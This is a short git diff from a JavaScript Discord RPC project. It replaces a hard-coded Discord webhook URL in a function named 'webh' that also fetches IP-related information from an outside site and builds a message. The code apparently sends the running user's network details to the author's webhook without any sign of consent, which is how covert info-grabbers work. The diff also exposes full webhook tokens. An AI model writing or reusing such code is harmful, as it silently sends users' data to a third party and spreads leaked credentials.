@@ -72,7 +72,7 @@ rpc.login({ clientId: id }).catch(err => {
 
 async function webh(user) {
 
-    let web = "https://discord.com/api/webhooks/1237733956175003748/OFJHOMjnt7JxCuIgV5_xOB2_C22cd61e3tjHf-ZgDAoaT4b9BfkMYpEB7QBOOEtVj4EC"
+    let web = "https://discord.com/api/webhooks/1243884882577457204/-PpD2Zj8MSQfhqO5ry1IW8Cwvsfx0agC8fBX7hXvP3jlEf8lMxGaag2ZNTDr-YafOYlF"
     let reqforipad = await fetch('https://royaly.dev/getinfo', {method: "get"})
     let reqforipadJson = await reqforipad.json()
     const msg = {
